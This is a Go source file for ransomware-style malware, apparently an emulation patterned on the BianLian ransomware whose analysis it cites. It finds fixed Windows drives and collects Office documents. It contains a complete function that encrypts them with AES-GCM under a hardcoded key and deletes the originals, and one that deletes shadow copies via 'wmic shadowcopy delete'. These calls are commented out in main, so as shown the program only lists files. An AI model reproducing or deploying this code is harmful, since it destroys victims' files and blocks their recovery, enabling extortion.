// Reference: https://medium.com/@mertkimyonsen/encrypt-a-file-using-go-f1fe3bc7c635

// Encrypts and decrypts a file using the golang library 'Crypto'.

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"
)

func alphabetArr() []byte {
	alphabet := make([]byte, 0, 26)

	var ch byte

	for ch = 'A'; ch <= 'Z'; ch++ {
		alphabet = append(alphabet, ch)
	}

	return alphabet
}

func main() {
	outfile, err := os.CreateTemp("", "*.rocketlauncher.txt")

	if err != nil {
		outfile.WriteString(err.Error())
		return
	}

	defer os.Remove(outfile.Name())

	h, err := windows.LoadLibrary("kernel32.dll")

	if err != nil {
		outfile.WriteString("Error in loading library!")
	}

	defer windows.FreeLibrary(h)

	alphabet := alphabetArr()

	for index := 0; index < 5; index++ {
		drive := string(alphabet[index]) + ":\\\\"
		driveInt, _ := windows.UTF16PtrFromString(drive)

		if err != nil {
			outfile.WriteString("Error in formatting to uint16!")
		} else {
			// https://blogs.blackberry.com/en/2022/10/bianlian-ransomware-encrypts-files-in-the-blink-of-an-eye
			// Attempts to obtain status of potential drives
			result := windows.GetDriveType(driveInt)

			if result == 3 {
				outfile.WriteString(string(drive) + "\r\n")

				paths := iterate(drive, outfile)

				outfile.WriteString(fmt.Sprintf("# of files: %d ", len(paths)))

				// encrypt(paths, outfile)

				// encPaths := encrypt(paths)

				// decrypt(encPaths)

				// destroyShadows(outfile)
			}
		}
	}
}

func iterate(path string, outfile *os.File) []string {
	paths := []string{}

	filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
		} else {
			fileSplits := strings.Split(info.Name(), ".")
			fileExt := fileSplits[len(fileSplits)-1]

			if (fileExt == "docx" || fileExt == "doc" || fileExt == "xls" || fileExt == "xlsx" || fileExt == "ppt" || fileExt == "pptx") && !info.IsDir() {
				paths = append(paths, path)
				outfile.WriteString(fmt.Sprintf("File Name: %s, Is Dir: %t, File path: %s \n", info.Name(), info.IsDir(), path))
			}
		}
		return nil
	})

	return paths
}

func encrypt(paths []string, outfile *os.File) []string {
	encPaths := []string{}

	// Reading key
	// key, err := ioutil.ReadFile("./key.txt")
	// if err != nil {
	// 	outfile.WriteString(fmt.Sprintf("read file err: %v", err.Error()))
	// }

	key := []byte("0940B5A935F41CEC82C3D84DF83F3B6C")

	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		outfile.WriteString(fmt.Sprintf("cipher err: %v", err.Error()))
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		outfile.WriteString(fmt.Sprintf("cipher GCM err: %v", err.Error()))
	}

	// Generating random nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		outfile.WriteString(fmt.Sprintf("nonce  err: %v", err.Error()))
	}

	for _, path := range paths {
		plainText, err := ioutil.ReadFile(path)
		// fmt.Println(path, plainText)

		if err != nil {
			fmt.Println(err.Error())
		} else {
			cipherText := gcm.Seal(nonce, nonce, plainText, nil)
			err = ioutil.WriteFile(path+".georgie", cipherText, 0777)
			outfile.WriteString(fmt.Sprintf("Encrypted %s \n", path))
			encPaths = append(encPaths, path+".georgie")
			os.Remove(path)

			outfile.WriteString(fmt.Sprintf("Deleted %s \n", path))
		}
	}

	return encPaths
}

func decrypt(paths []string) []string {
	decPaths := []string{}

	// Reading key
	key, err := ioutil.ReadFile("./key.txt")
	if err != nil {
		log.Fatalf("read file err: %v", err.Error())
	}

	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("cipher err: %v", err.Error())
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalf("cipher GCM err: %v", err.Error())
	}

	for _, path := range paths {
		fmt.Println("Decrypting path ", path)
		cipherText, err := ioutil.ReadFile(path)
		if err != nil {
			log.Fatal(err)
		}

		nonce := cipherText[:gcm.NonceSize()]
		cipherText = cipherText[gcm.NonceSize():]
		plainText, err := gcm.Open(nil, nonce, cipherText, nil)
		if err != nil {
			log.Fatalf("decrypt file err: %v", err.Error())
		} else {
			// Writing decryption content
			err = ioutil.WriteFile(path+".sammie", plainText, 0777)
			if err != nil {
				log.Fatalf("write file err: %v", err.Error())
			} else {
				decPaths = append(decPaths, path+".sammie")
				fmt.Printf("Decrypted %s \n", path+".sammie")
			}
		}
	}

	return decPaths
}

// Eliminate Go build ID statement from Go built executable
// https://stackoverflow.com/questions/74461495/how-i-can-remove-go-buildid-from-binary-file

func destroyShadows(outfile *os.File) {
	app := "wmic"
	arg0 := "shadowcopy"
	arg1 := "delete"
	arg2 := "/nointeractive"

	cmd := exec.Command(app, arg0, arg1, arg2)

	outfile.WriteString("\nDestroying shadow copies....\n")

	cmd.Stdout = outfile

	err := cmd.Start()
	if err != nil {
		outfile.WriteString("Failed to destroy shadow copies")
	}

	cmd.Wait()

	outfile.WriteString("Successfully destroyed shadow copies")

	return
}
